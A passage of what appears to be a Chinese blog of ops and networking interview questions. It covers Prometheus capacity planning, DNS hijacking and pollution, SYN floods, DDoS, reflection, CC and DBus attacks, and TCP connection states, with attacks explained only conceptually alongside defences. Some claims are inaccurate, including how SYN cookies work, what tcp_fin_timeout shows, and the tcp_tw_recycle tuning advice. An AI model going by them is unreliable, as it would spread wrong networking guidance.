不一定保证数据准确，这里的不准确一是指 rate、histogram_quantile 等函数会做统计和推断，产生一些反直觉的结果，这个后面会详细展开。二来查询范围过长要做降采样，势必会造成数据精度丢失，不过这是时序数据的特点，也是不同于日志系统的地方 采集组件 All IN One Prometheus 体系中 Exporter 都是独立的，每个组件各司其职，如机器资源用 Node-Exporter，Gpu 有Nvidia Exporter等等。但是 Exporter 越多，运维压力越大，尤其是对 Agent做资源控制、版本升级。我们尝试对一些Exporter进行组合，方案有二：\n通过主进程拉起N个 Exporter 进程，仍然可以跟着社区版本做更新、bug fix。 用Telegraf来支持各种类型的 Input，N 合 1。另外，Node-Exporter 不支持进程监控，可以加一个Process-Exporter，也可以用上边提到的Telegraf，使用 procstat 的 input来采集进程指标。 合理选择黄金指标 采集的指标有很多，我们应该关注哪些？Google 在 “Sre Handbook” 中提出了“四个黄金信号”：延迟、流量、错误数、饱和度。实际操作中可以使用 Use 或 Red 方法作为指导，Use 用于资源，Red 用于服务。\nUse 方法：Utilization、Saturation、Errors。如 Cadvisor 数据 Red 方法：Rate、Errors、Duration。如 Apiserver 性能指标 Prometheus 采集中常见的服务分三种：\n在线服务：如 Web 服务、数据库等，一般关心请求速率，延迟和错误率即 RED 方法 离线服务：如日志处理、消息队列等，一般关注队列数量、进行中的数量，处理速度以及发生的错误即 Use 方法 批处理任务：和离线任务很像，但是离线任务是长期运行的，批处理任务是按计划运行的，如持续集成就是批处理任务，对应 K8S 中的 job 或 cronjob， 一般关注所花的时间、错误数等，因为运行周期短，很可能还没采集到就运行结束了，所以一般使用 Pushgateway，改拉为推。 如何采集 LB 后面的 RS 的 Metric 假如你有一个负载均衡 LB，但网络上 Prometheus 只能访问到 LB 本身，访问不到后面的 RS，应该如何采集 RS 暴露的 Metric？\nRS 的服务加 Sidecar Proxy，或者本机增加 Proxy 组件，保证 Prometheus 能访问到。 LB 增加 /backend1 和 /backend2请求转发到两个单独的后端，再由 Prometheus 访问 LB 采集。 Prometheus 大内存问题 随着规模变大，Prometheus 需要的 CPU 和内存都会升高，内存一般先达到瓶颈，这个时候要么加内存，要么集群分片减少单机指标。这里我们先讨论单机版 Prometheus 的内存问题。\n原因：\nPrometheus 的内存消耗主要是因为每隔2小时做一个 Block 数据落盘，落盘之前所有数据都在内存里面，因此和采集量有关。 加载历史数据时，是从磁盘到内存的，查询范围越大，内存越大。这里面有一定的优化空间。 一些不合理的查询条件也会加大内存，如 Group 或大范围 Rate。 我的指标需要多少内存：作者给了一个计算器，设置指标量、采集间隔之类的，计算Prometheus 需要的理论内存值：计算公式\n以我们的一个 Prometheus Server为例，本地只保留 2 小时数据，95 万 Series，大概占用的内存如下：\n有什么优化方案：\nSample 数量超过了 200 万，就不要单实例了，做下分片，然后通过 Victoriametrics，Thanos， Trickster 等方案合并数据。 评估哪些 Metric 和 Label 占用较多，去掉没用的指标。2.14 以上可以看 Tsdb 状态 查询时尽量避免大范围查询，注意时间范围和 Step 的比例，慎用 Group。 如果需要关联查询，先想想能不能通过 Relabel 的方式给原始数据多加个 Label，一条Sql 能查出 来的何必用Join，时序数据库不是关系数据库。 Prometheus 内存占用分析：\n通过 pprof分析 1.X 版本的内存 相关 issue： https://groups.google.com/forum/#!searchin/prometheus-users/memory%7Csort:date/prometheus-users/q4oiVGU6Bxo/uifpXVw3CwAJ https://github.com/prometheus/prometheus/issues/5723 https://github.com/prometheus/prometheus/issues/1881 Prometheus 容量规划 容量规划除了上边说的内存，还有磁盘存储规划，这和你的 Prometheus 的架构方案有关。\n如果是单机Prometheus，计算本地磁盘使用量。 如果是 Remote-Write，和已有的 Tsdb 共用即可。 如果是 Thanos 方案，本地磁盘可以忽略（2H)，计算对象 Prometheus 每2小时将已缓冲在内存中的数据压缩到磁盘上的块中。包括Chunks、Indexes、Tombstones、Metadata，这些占用了一部分存储空间。一般情况下，Prometheus中存储的每一个样本大概占用1-2字节大小（1.7Byte）。可以通过Promql来查看每个样本平均占用多少空间：\n如果大致估算本地磁盘大小，可以通过以下公式：$磁盘大小=保留时间每秒获取样本数样本大小$\n保留时间(retention_time_seconds)和样本大小(bytes_per_sample)不变的情况下，如果想减少本地磁 盘的容量需求，只能通过减少每秒获取样本数(ingested_samples_per_second)的方式。\n查看当前每秒获取的样本数：\nrate(prometheus_tsdb_head_samples_appended_total[1h]) 有两种手段，一是减少时间序列的数量，二是增加采集样本的时间间隔。考虑到 Prometheus 会对时间 序列进行压缩，因此减少时间序列的数量效果更明显。\n举例说明：\n采集频率 30s，机器数量1000，Metric种类6000，1000600026024 约 200 亿，30G 左右磁盘。 只采集需要的指标，如 match[], 或者统计下最常使用的指标，性能最差的指标。 以上磁盘容量并没有把 wal 文件算进去，wal 文件(Raw Data)在 Prometheus 官方文档中说明至少会保存3个 Write-Ahead Log Files，每一个最大为128M(实际运行发现数量会更多)。\n因为我们使用了 Thanos 的方案，所以本地磁盘只保留2H 热数据。Wal 每2小时生成一份Block文件，Block文件每2小时上传对象存储，本地磁盘基本没有压力。\n","permalink":"https://www.oomkill.com/2021/10/interview-monitor/","summary":"","title":"监控类面试题"},{"content":"域名相关 什么是DNS劫持 DNS劫持就是通过劫持了DNS服务器，通过某些手段取得某域名的解析记录控制权，进而修改此域名的解析结果，导致对该域名的访问由原IP地址转入到修改后的指定IP，其结果就是对特定的网址不能访问或访问的是假网址，从而实现窃取资料或者破坏原有正常服务的目的。DNS劫持通过篡改DNS服务器上的数据返回给用户一个错误的查询结果来实现的。\n通俗来讲：DNS劫持就是指用户访问一个被标记的地址时，DNS服务器故意将此地址指向一个错误的IP地址的行为。范例，网通、电信、铁通的某些用户有时候会发现自己打算访问一个地址，却被转向了各种推送广告等网站，这就是DNS劫持。\nDNS劫持症状：在某些地区的用户在成功连接宽带后，首次打开任何页面都指向ISP提供的“电信互联星空”、“网通黄页广告”等内容页面。还有就是曾经出现过用户访问Google域名的时候出现了百度的网站。这些都属于DNS劫持。\n解决：对于DNS劫持，可以采用使用国外免费公用的DNS服务器解决。例如OpenDNS（208.67.222.222）或GoogleDNS（8.8.8.8）。\n什么是DNS污染 DNS污染是指在DNS服务器中修改DNS解析结果的过程，以便将用户重定向到恶意网站或欺骗性网站，而不是所期望的目标网站。\n攻击者可以通过多种方式进行DNS污染攻击。最常见的手段是在用户的网络中添加一个恶意DNS服务器，或者在受感染的计算机上运行一个恶意DNS服务器。当用户试图连接到互联网上的某个网站时，计算机将查询DNS服务器以查找目标网站的IP地址。如果攻击者控制的恶意DNS服务器已将相应的IP地址修改为攻击者的网站，则用户将被重定向到恶意网站或欺骗性网站。\nDNS污染发生在用户请求的第一步上，直接从协议上对用户的DNS请求进行干扰。 DNS污染症状：目前一些被禁止访问的网站很多就是通过DNS污染来实现的，例如YouTube、Facebook等网站。\n解决：\n可靠的DNS服务器，但这种方式效果不佳 手动修改Hosts文件 使用VPN或域名远程解析 加密通信：VPN可以加密整个通信过程，这意味着攻击者无法窃取UDP数据包中的任何信息，包括DNS查询请求和响应。这样可以避免DNS查询被篡改的风险。 虚拟IP地址：VPN会给每个用户分配其所连接的虚拟IP地址，使用户的真实IP地址不会暴露在公共互联网中。这样，DNS服务器只能看到VPN服务器的IP地址，而无法识别用户的IP地址。这意味着攻击者无法跟踪用户的访问历史，从而减少遭受DNS污染攻击的风险。 总结：\nDNS污染，指的是用户访问一个地址，国内的服务器(非DNS)监控到用户访问的已经被标记地址时，服务器伪装成DNS服务器向用户发回错误的地址的行为。范例，访问Youtube、Facebook之类网站等出现的状况。\n什么是域名被墙 这种情况一般出现在解析为国外地址的域名上，假如域名下的网站非法信息多，敏感，又不整改，会直接被G.F.W墙掉，就是通常所说的被封锁、被屏蔽、被和谐，结果就是访问域名是打不开的，但是解析是正常的。此时域名在国内是无法使用的，国外可以访问和使用。\n主要有以下几种情况：\nip 被墙 解决：换 ip 。 域名被 url 重置（访问时出现ERR_CONNECTION_RESET 或 “连接重置” 换域名 做301跳转，(有专门服务商)，域名通过解析到国内301服务商，重定向到真是国外IP，以减少流量和权重的丢失。 上 https或域名备案，智能解析分国内，国外 。 可以使用HTTPS；一般来讲解析到国外的IP的域名，有敏感词会被重置，GFW可以进行敏感词检测（http为明文），使用https加密GFW无法检测数据包内容 ，（客户端与服务端默认会有公钥私钥，而GFW没有）。 域名被国家出口 dns 污染，解决：用国内 dns ，备案回国。 域名被省级 dns 污染，解决：能做到这个这里可能为内部或对应运营商被黑（只能进行dns清洗，一般大流量域名了） 什么是DNS清洗？ DNS清洗是一项旨在阻止访问特定网站和域名的措施，在该措施中，Internet服务提供商（ISP）通过其服务器筛选特定网站的DNS查询，并将查询重定向到一个错误的IP地址（通常是一个不存在的地址），从而防止用户访问该网站。这种措施通常是由政府、公司或组织实施，旨在防止用户接触到不适当、危险或非法的内容。\n网络攻击相关 什么是TCP的SYN攻击？如何预防？ TCP SYN攻击是一种利用TCP协议三次握手机制的攻击。攻击者发送大量伪造的TCP SYN请求（数据包），然后在TCP三次握手建立连接的第二步时停止（使服务器不断地向攻击者发送SYN-ACK确认，但攻击者不回复ACK确认），从而导致服务器等待客户端的确认信号很长时间，最终占用服务器的资源而无法处理新的请求。\n为了预防TCP SYN攻击，可以采取以下措施：\n服务器操作系统的设置：可以设置TCP的连接数和时间等参数，限制每个IP地址的连接数，设置连接超时时间。 防火墙设置：可以设置防火墙规则，根据IP地址、端口等信息对连接进行过滤，控制IP地址的访问等。 加强网络监测：使用入侵检测系统（IDS）对流量进行实时监控，并对异常流量进行报警处理。 使用SYN Cookies：SYN cookies是一种可以防止SYN攻击的技术，它通过特殊的算法对TCP连接进行加密，并保存在服务器端，当客户端发送响应时，服务器端可以对连接进行识别和验证，从而防止SYN攻击。 增加硬件设备：可以增加具有流量分析和过滤功能的硬件设备来协助防御SYN攻击，这种设备可以通过分析流量实现精细化的流量分析和识别。 ddos攻击的类型 DDoS攻击（Distributed Denial of Service）是一种利用许多计算机和网络设备构成的“僵尸网络”对一个或多个目标服务器发起攻击，从而占用大量的网络资源，耗尽系统资源，导致服务拒绝的攻击方式。DDoS攻击的类型可以分为以下几种：\n带宽攻击（Bandwidth-based Attack）：利用大量的数据流或报文，通过消耗目标系统的网络带宽使其服务不能正常传输。 应用层攻击（Application-Layer Attack）：利用正常流量模拟合法用户的请求，通过消耗服务器CPU和内存资源使其无法处理合法请求。 反射式攻击（Reflection Attack）：使用伪造的IP地址向网络中的一个或多个服务器发起请求，这些服务器会响应请求，但响应信息将被发回目标服务器，从而形成了一次反射式攻击。 慢速攻击（Slowloris Attack）：利用HTTP协议的设计漏洞，向目标服务器发送大量不完整请求，从而占用目标服务器处理请求的线程资源。 IoT攻击（IoT Attack）：通过侵入大量的物联网设备，如路由器、摄像头、智能家居等，利用这些设备来发起攻击，构建大规模的“僵尸网络”。 DNS Amplification攻击：攻击者向域名服务器发送请求，利用伪造的IP地址和请求报文，让服务器向目标主机发送大量的DNS解析响应数据包，从而使目标系统在短时间内遭受网络拥塞。 NTP Amplification攻击：攻击者伪造IP地址，向其余互联网上安装有网络时间服务器（Network Time Protocol，NTP）软件的服务器发送请求，从而获取大量NTP响应包，最终将其转发到目标IP地址，从而占用目标系统的网络带宽。 SYN Flood攻击：攻击者向目标服务器发送大量的TCP SYN请求，但却不发送客户端的应答确认，造成服务器长时间处于等待状态，无法接受正常的TCP连接请求。 HTTP Flood攻击：攻击者利用HTTP叠加攻击、HTTP POST攻击等手段，向目标系统发送大量HTTP请求和数据包，造成目标系统资源的耗尽，从而导致服务不可用。 ICMP Flood攻击：攻击者向目标系统发送大量的ICMP数据包，造成目标系统CPU和内存资源的消耗，从而导致系统缓慢或崩溃。 什么是反射式攻击 反射式攻击（Reflection Attack）是一种利用网络协议的设计缺陷进行攻击的方式。攻击者通常会利用一些可以进行源地址欺骗或反射的协议，例如Domain Name System（DNS），Simple Network Management Protocol（SNMP），和Network Time Protocol（NTP）等。攻击者利用这些协议在网络中进行广播，构造一些请求消息，伪造源IP地址为目标IP地址，将请求消息发送给网络上的服务器，要求其向目标IP地址回送响应。这样攻击者就可以通过伪造的IP地址对目标系统进行攻击，占用它的网络带宽和资源，极大地降低了目标系统的可用性。\n反射式攻击的原理：\n攻击者使用一个随机IP地址，向一个有可能反射请求的服务器发送一个请求包。 攻击者伪造请求包的源IP地址为目标IP地址。 服务器收到请求包后，会根据请求包中的信息回复一个响应包到目标IP地址。 攻击者的随机IP地址会收到一个错误的响应包，而目标IP地址会收到大量的响应包，引起服务器的网络拥塞和系统负载过高。 反射式攻击的特点是可以发动大规模的攻击，难以追踪攻击者的真实身份。 为了避免反射式攻击带来的影响，应加强对网络设备的安全性监管，限制端口映射或在系统中配置反射式攻击防御机制等。\n什么是CC攻击 CC攻击是一种网络攻击，也称为HTTP CC攻击。\nCC是英文“Challenge Collapsar”的缩写，意思是“挑战式崩溃”。这种攻击通常是攻击者使用大量的机器在同一时间，对目标网站发送数以万计的HTTP请求，耗费网站的带宽和Web服务器资源，从而使得目标网站难以提供正常的服务。\nCC 攻击的原理：\n攻击者使用大量的机器，在短时间内对目标网站发送大量的请求，即HTTP GET和HTTP POST请求。 攻击者使用IP地址欺骗进行伪造，以避免被目标网站发现。 目标网站在处理大量请求的同时，网络带宽和服务器资源被消耗，导致无法正常处理合法用户的请求。 这种攻击方式是一种专门针对Web应用的攻击，能够对目标网站造成极大的破坏。 CC攻击具有隐蔽性强、攻击目标精准、攻击规模大的特点，对于商业网站和金融机构等重要场所，尤其危害性较高。为了防范CC攻击，应采用一系列的安全措施，包括但不限于：IP限制、用户访问控制、流量清洗系统、高级请求监控和识别等。\ncc攻击和ddos攻击有什么区别 CC攻击和DDoS攻击都是一种网络攻击方式，但它们具有不同的特点和目的，可以通过以下几个维度进行区分：\n发起机制：DDoS攻击通常使用由许多受感染的计算机组成的僵尸网络向目标服务器发起攻击；而CC攻击则利用大量的请求浪费目标网站的资源，其通常由单个或少量主机发起。 对服务器的影响：DDoS攻击通常通过占用服务器的网络带宽和处理能力消耗服务器资源，从而使服务器无法处理合法的请求。而CC攻击通常会利用大量的HTTP请求消耗目标服务器的网络带宽和Web服务器资源，从而使目标网站无法提供正常的服务。 目的不同：DDoS攻击的目的通常是摧毁或瘫痪目标网站，其目的往往是为了实现利润或危害竞争对手。而CC攻击通常用于使目标网站的网络带宽和服务器资源不可用，以达到一定的干扰或损坏目的。 防御方式：DDoS攻击通常需要综合多种防护手段，包括入侵检测系统、防火墙、流量清洗系统等；而CC攻击通常可以通过增加带宽、配置IP限制、使用反垃圾过滤系统等简单的措施进行防御。 总的来说，CC攻击主要针对Web应用程序和网站，其攻击手段比DDoS攻击更加简单和直接，而DDoS攻击则涉及到更多的计算机协调，其对目标服务器造成的影响也更为广泛和严重。\nDBus攻击 DBus（Desktop Bus）是用于在Linux系统中应用程序之间进行通信的一种机制。DBus通信协议是所有Linux桌面环境（如GNOME和KDE）的核心组件。DBus协议本身并没有安全问题，但是由于应用程序在通信时可能会使用明文传输敏感信息（例如登录密码），因此DBus协议仍然存在被黑客攻击的风险。\nDBus攻击主要有以下几种方式\n端口监听攻击：DBus默认使用unix-socket，如果未被正确配置只能在特定用户之间使用。如果DBus暴露在公网上，并启用了TCP/IP支持，则可能会受到端口监听攻击。 消息劫持攻击：假冒攻击者可以伪造DBus通信的结构头和消息体，并将其发送到目标程序。这样可以使目标程序对不良消息进行响应并以不合适的方式执行命令或泄漏敏感信息。 执行命令攻击：攻击者可以通过发送DBus消息来请求目标程序执行特定的操作。如果目标程序没有执行严格的访问控制，那么攻击者可能会成功执行恶意操作。 为了防止DBus攻击，可以采取以下预防措施：\n使用策略控制：通过在DBus配置文件中设置安全策略，在文件中定义一系列规则，以控制哪些应用程序可以访问DBus总线，以及哪些应用程序可以以哪种方式访问DBus总线。 使用加密通信：可以使用SSL或TLS等安全协议对DBus通信进行加密，以确保DBus通信传输的数据不会被窃取或篡改。 调用API实现过滤和审核：可以通过DBus接口的API调用来检查和验证DBus消息中的请求和响应是否合法，如果失败，则拒绝执行DBus请求命令。 更新操作系统和软件：可以定期更新Linux操作系统和DBus相关软件的版本，以修复可能出现的安全漏洞，从而提高DBus协议的安全性。 综上所述，DBus协议是任何Linux桌面环境中的核心组件，因此必须采取一系列的安全预防措施防止攻击者利用漏洞对DBus协议进行攻击。\n网络相关 OSI模型和TCP/IP模型有什么区别？ OSI模型和TCP/IP模型都是网络通信时使用的通信协议模型\nOSI模型通常表示一个网络请求的完整路径，而TCP/IP模型通常表示Linux 内核网络栈中的模型\nOSI模型包括7个层次：物理层、数据链路层、网络层、传输层、会话层、表示层和应用层。\nTCP/IP模型则是由4个层次组成：网络接口层、网络层、传输层和应用层\n简述TCP重传时的ACK机制？ TCP协议中的重传机制是保证数据传输可靠性的关键，它使用一个称为确认（ACK）的机制来标记接收到的数据段。TCP准确地检测丢失或重复数据包，并要求发送方重发丢失的数据包，直到接收方确认收到该数据包。\n当TCP发送方发现某个数据包未收到确认时，会启动重传机制。它会重发此数据包并设置一个计时器，在计时器超时前等待接收方的确认，并在接收方回复确认后将计时器停止。如果在计时器超时之前，没有收到确认，则认为此数据包丢失，就会重发相同的数据包，并随之设置新的计时器。\n每次成功发送数据包后，TCP发送方将等待接收方发回一个相应的确认，以确认数据包已经被正确接收。接收方会在ACK中包含一个确认号（ACK number），该数值表示收到的最后一个正确的数据包的编号，这表明它准备接收下一数据包并告诉发送端可以继续发送数据。\n总之，TCP重传时的ACK机制，是通过发送数据包、等待接收方确认、超时时间检测等多步操作来检查数据包传输是否能够成功到达，同时保证数据的可靠传输。\n常见的TCP连接报错有哪些? Connection reset by peer：通常是由于远程端重置连接造成的，发送的是 RST 强制中断连接\n这类问题主要发生在连接关闭的情况下，在tcp连接中，双方是对等连接 peer，当数据包从连接的一端发送，但另一端无法识别到连接时，会返回设置了RST位的数据包，用来强制关闭连接。\n通常情况下，会立即中断连接，并且绕过了正常关闭的2MSL时间。例如：\n客户端关闭了连接，而服务器还在给客户端发送数据。 服务器超载，服务端强制关闭掉一些连接。 Connection timeout：般为建立连接在最大超时时间后没有收到来自服务端的相应，此时客户端将收到错误信息。\nConnection refused：通常出现在连接某一服务的端口时发生（拒绝机制是 TCP RST 标志），通常情况下包含一下情况：\n目标主机端口未开放 端口开放了，但处理其连接堆积或已满。 客户端与服务端防火墙阻碍其连接。（客户端和服务端防火墙均会发生） Port Unavailable：通常由于TCP连接的目标端口已经被占用, 或是网络路由器的设置引起的。\nHost Unreachable：主机不可达错误通常由于网络路由故障引起的，它表示目标主机无法被连接，有可能是由于网络故障或是DNS解析错误引起的。\n什么是TCP Reset（RST） 当收到意外数据包（非正常3次握手进行的连接）到达主机时，此时会重置连接，重置的数据包是设置了RST位的数据包。\n常见的有以下情况：\n一个初始数据包 (初始数据包SYN) 尝试向一个没有任何进程的监听地址发起连接时，会出现次状态（如：curl localhost $non-listen-port） 在之前建立的连接，并且本地已经关闭socket或退出。 防火墙的拦截 数据包到达先前建立的TCP连接，但本地应用程序已关闭其套接字或退出，并且操作系统已关闭该套接字。\n常见TCP的连接状态有哪些？ 三次握手期间：\nCLOSED：初始状态。\nLISTEN：服务器处于监听状态。\nSYN_SEND：客户端socket执行CONNECT连接，发送SYN包，进入此状态。\nSYN_RECV：服务端收到SYN包并发送服务端SYN包，进入此状态。\nESTABLISH：表示连接建立。客户端发送了最后一个ACK包后进入此状态，服务端接收到ACK包后 进入此状态。\n四次挥手期间：\nFIN_WAIT_1：终止连接的一方（通常是客户机）发送了FIN报文后进入。等待对方FIN。 CLOSE_WAIT：（假设服务器）接收到客户机FIN包之后等待关闭的阶段。在接收到对方的FIN包之 后，自然是需要立即回复ACK包的，表示已经知道断开请求。但是本方是否立即断开连接（发送FIN 包）取决于是否还有数据需要发送给客户端，若有，则在发送FIN包之前均为此状态。 FIN_WAIT_2：此时是半连接状态，即有一方要求关闭连接，等待另一方关闭。客户端接收到服务器 的ACK包，但并没有立即接收到服务端的FIN包，进入FIN_WAIT_2状态。 LAST_ACK：服务端发动最后的FIN包，等待最后的客户端ACK响应，进入此状态。 TIME_WAIT：客户端收到服务端的FIN包，并立即发出ACK包做最后的确认，为此之后的2MSL时间 客户端为TIME_WAIT状态。 CLOSE_WAIT状态的产生、危害、如何避免？ 客户端TCP状态迁移：\nCLOSED-\u0026gt;SYN_SENT-\u0026gt;ESTABLISHED-\u0026gt;FIN_WAIT_1-\u0026gt;FIN_WAIT_2-\u0026gt;TIME_WAIT-\u0026gt;CLOSED\r服务器TCP状态迁移：\nCLOSED-\u0026gt;LISTEN-\u0026gt;SYN_RECV-\u0026gt;ESTABLISHED-\u0026gt;CLOSE_WAIT-\u0026gt;LAST_ACK-\u0026gt;CLOSED\r【答】：\n产生: TCP连接的两端都可以发起关闭连接的请求，若对端发起了关闭连接，但本地没有进行后续的关闭连接操作，那么该链接就会处于CLOSE_WAIT状态。\n在某种情况下应用关闭了socket连接,但是服务端忙于读或者写，没有关闭连接。 在被动关闭连接情况下，在已经接收到FIN，但是还没有发送自己的FIN的时刻，连接处于CLOSE_WAIT状态。通常来讲，CLOSE_WAIT状态的持续时间应该很短，正如SYN_RCVD状态。但是在一些特殊情况下，就会出现连接长时间处于CLOSE_WAIT状态的情况。 危害：CLOSE_WAIT 会使连接处于假死状态，连接本身占用的资源不会被释放。网络服务器程序要同时管理大量连接，所以很有必要保证无用连接完全断开，否则大量僵死的连接会浪费许多服务器资源。\n如何避免：\n更详细分析可以看：https://www.cnblogs.com/shengs/p/4495998.html\nTCP的关闭 TCP 支持两种类型的连接释放：\n优雅关闭：正常的四次挥手\n突然关闭：发送RST段，即TCP Reset\n当为不存在的 TCP 连接接收到非 SYN 段时 在已打开的连接中，某些 TCP 实现会在收到具有无效标头的段时会发送 RST 段。 这将通过关闭相应的连接来防止攻击。 当某些实现需要关闭现有的 TCP 连接时，它们会发送一个 RST 段。 将立即关闭现有的 TCP 连接： 缺乏支持连接的资源 远程主机现在无法访问并且已停止响应 TIME_WAIT 状态的产生、危害、如何避免？ 【答】：\n产生：TCP在关闭连接的四次挥手中，为了应对最后一个ACK 丢失的情况，Client(主动关闭的一方)需要维持TIME_WAIT状态，并停留2MSL的时间。\n危害：\n浪费系统资源：大量的TIME_WAIT状态会占用系统资源（用户的文件句柄 如端口） 降低系统性能： 如何避免：在 /etc/sysctl.conf文件中开启 net.ipv4.tcp_tw_reuse重用，和net_ipv4.tcp.tw_recycle 快速回收。\nTIME_WAIT 和 CLOSE_WAIT区别 主动关闭的一端是 TIME_WAIT；即客户端主动关闭TIME_WAIT出现在客户端，服务端主动关闭 TIME_WAIT出现在服务端 被动关闭的一端是 CLOSE_WAIT；通常情况下，服务端会维护大量的CLOSE_WAIT 服务端出现 CLOSE_WAIT则客户端永远不会出现 TIME_WAIT CLOSE_WAIT 一般发生在服务在接收到关闭信号后没有正确关闭连接 TIME_WAIT 会随着2MSL的时长而积压 服务端 在 发送 两次 ACK 与 FIN后，即收到FIN后客户端（主动断开端）才会转变为 TIME_WAIT 结束CLOSE_WAIT状态，对应的应用程序必须显式关闭打开套接字（或退出） ss命令可以强制关闭套接字 ss \u0026ndash;tcp state CLOSE-WAIT \u0026ndash;kill 关闭对应状态的连接 ss \u0026ndash;tcp state CLOSE-WAIT \u0026lsquo;( dport = 22 or dst 1.1.1.1 )\u0026rsquo; \u0026ndash;kill 过滤操作\n2MSL的值是多少？ 2MSL (Maximum Segment Lifetime) 作为TCP 连接的“关闭”过程的一部分，是在 RFC 793(TCP)，Linux内核的默认MSL设置为 60 秒，2MSL为120s，可以通过cat /proc/sys/net/ipv4/tcp_fin_timeout查看。\n在 Check Point VPN网关中，R80.20 及更高版本中，默认的 TCP 超时5秒。\nReference\n2MSL\n为什么客户端要等2MSL TCP / IP协议中使用2MSL来等待连接中的可能尚未到达的遗留数据包。当一个TCP连接关闭时，每个端口必须等待2MSL时间，以确保对方端口正确接收了所有数据段。以下是对不同情况下等待时间的解释：\n如果等待时间小于1MSL，可能会有数据包丢失，从而导致通信不完整。 如果等待时间等于1MSL，TCP连接完成后，存在某些可能尚未到达的数据包，这些数据包在此时间段内将没有机会重传，因此可能会导致通信不完整。 如果等待时间大于2MSL，虽然可以确保数据包被完全接收并处理，但是长时间的等待可能会影响网络效率并占用网络资源。 因此，2MSL时间是一个标准和安全的等待时间，可确保TCP连接关闭时没有未接收的数据包。\n《UNIX网络编程(卷1)》提到，TIME_WAIT的作用大概是下述两部分：\n实现可靠地TCP连接终止 为了可靠的终止TCP的全双工连接，当客户端发送的最后一个ACK丢失，服务端会重传FIN，为了接收超时并重传FIN，客户端就需要一个TIME_WAIT，如果RTO（Retransmission Timeout）小于MSL，那么TIME_WAIT的大小为MSL就足够了，如果RTO大于2MSL，则TIME_WAIT大小为2MSL已经不够了，所以只有TIME_WAIT状态介于 MSL与2MSL之间，才实现可靠地TCP连接终止。通常情况下RTO要比MSL小很多，但是考虑到最糟糕的情况，RTO是2MSL 允许旧的重复段在网络中过期 为了保证在这个连接期间产生的所有数据包都从网络中消失，即保证在建立新的TCP连接时，来自该连接的旧的重复数据包已经在网络中消失了； 此时存在一个问题：当客户端回复最后一个ACK后，用一个MSL时间就可以断开双方的连接（所有的数据包都消失）。为什么需要2MSL才可以？ 这是因为假设在客户端发送ACK刚刚过了一个MSL时间，而服务端在收到这个ACK之前一瞬间刚好启动超时重传FIN，所以要等这个FIN也消失，就是2MSL了。文中所指的另一个方向的应答应该就是这个超时重传的FIN。 Reference\nwhy time wait state need to be 2msl long\nin the tcp state transition diagram why do we have\nRTO和MSL RTO和MSL是两个完全独立的定义，它们之间没有特定的依赖关系。RTO是一个时间间隔，在未收到对方确认的情况下触发重传，并根据网络连接的延迟和拥塞情况进行调整。而MSL则是一个固定的时间，在TCP连接关闭后，用于保持最后的ACK数据包保持活动状态的时间。\n尽管RTO和MSL没有直接关联，但是RTO和MSL都涉及到TCP数据包的传输和处理。RTO值需要在某些情况下限制其最小值，以避免过度等待，例如在快速重传和快速恢复等TCP机制中。而MSL在TCP数据包传输网络中扮演着非常重要的角色，以确保在TCP连接关闭后遗留的数据包都能达到其目的地，同时避免后续的混淆与冲突。\nRTO和MSL是TCP / IP协议中的两个超时机制，这些机制都与传输控制协议（TCP）的数据包传输相关。以下是它们之间的区别：\nRTO (Retransmission Time Out)：是指在TCP / IP网络中，当一个数据包发送后，期望在多长时间内收到对方回应的时间。如果在该时间内没有收到回应，则认为该数据包已丢失，发起重传。RTO时间间隔通常根据TCP窗口大小调整，一般都比MSL的时间间隔短。 MSL (Maximum Segment Lifetime)：是指在TCP网络中，一个数据包在网络中传输的最长时间。当超过这个时间后，该数据包将被认为已经过期并被丢弃。通常，MSL是30秒，是一个相对不变的时间阈值，不会随着网络的突发变化而发生变化。 总的来说，RTO和MSL都是与TCP传输相关的超时机制，但它们的目的和应用场景略有区别：RTO用于控制未收到响应时的重传时间间隔，而MSL用于控制关闭连接后等待可能未到达的数据包的最长时间。\nTCP 和 UDP 的区别？ TCP是稳定、可靠、⾯向连接的传输层协议，它在传递数据前要三次握⼿建⽴连接，在数据传递时，有确认机制、重传机制、流量控制、拥塞控制等，可以保证数据的正确性和有序性。 UDP是⽆连接的数据传输协议，端与端之间不需要建⽴连接，且没有类似TCP的那些机制，会发⽣丢包、乱序等情况。\nTCP是数据流模式，⽽UDP是数据报模式。\n为什么 TCP 叫数据流模式？ UDP 叫数据报模式？ 【答】：最大的一个区别就是，TCP包头允许数据的分段，会携带每段的编号，而UDP只携带数据长度及校验码\n所谓的“流模式”，是指TCP发送端发送⼏次数据和接收端接收⼏次数据是没有必然联系的，⽐如你通过 TCP 连接给另⼀端发送数据，你只调⽤了⼀次 write，发送了100个字节，但是对⽅可以分10次收完，每次10个字节；你也可以调⽤10次 write，每次10个字节，但是对⽅可以⼀次就收完。\n原因：这是因为TCP是⾯向连接的，⼀个 socket 中收到的数据都是由同⼀台主机发出，且有序地到达，所以每次读取多少数据都可以。\n所谓的“数据报模式”，是指UDP发送端调⽤了⼏次 write，接收端必须⽤相同次数的 read 读完。UDP 是基于报⽂的，在接收的时候，每次最多只能读取⼀个报⽂，报⽂和报⽂是不会合并的，如果缓冲区⼩于报⽂⻓度，则多出的部分会被丢弃。\n原因：这是因为UDP是⽆连接的，只要知道接收端的 IP 和端⼝，任何主机都可以向接收端发送数据。 这时候， 如果⼀次能读取超过⼀个报⽂的数据， 则会乱套\nTCP建⽴连接为什么需要三次？断开连接⼜为什么需要四次？ 【答】：\n“三次握⼿”的主要⽬的是为了防⽌已失效的连接请求报⽂段突然⼜传送到了服务端，因⽽产⽣错误。\n例如：client发出的第⼀个连接请求报⽂段并没有丢失，⽽是在某个⽹络结点⻓时间的滞留了，以致延误到连接释放以后的某个时间才到达server。本来这是⼀个早已失效的报⽂段。但server收到此失效的连接请求报⽂段后，就误认为是client再次发出的⼀个新的连接请求。于是就向client发出确认报⽂段，同意建⽴连接。假设不采⽤“三次握⼿”，那么只要server发出确认，新的连接就建⽴了。由于现在client并没有发出建⽴连接的请求，因此不会理睬server的确认，也不会向server发送ack包。\n“四次挥⼿”主要是为了确保数据能够完成传输。\n因为TCP连接是全双⼯的(即数据可在两个⽅向上同时传递)，关闭连接时，当收到对⽅的FIN报⽂通知时，它仅仅表示对⽅没有数据发送给你了；但未必你所有的数据都全部发送给对⽅了，所以你可以未必会⻢上会关闭SOCKET,也即你可能还需要发送⼀些数据给对⽅之后，再发送FIN报⽂给对⽅来表示你同意现在可以关闭连接了，所以它这⾥的ACK报⽂和FIN报⽂多数情况下都是分开发送的。\nTCP协议如何提供可靠性的？ 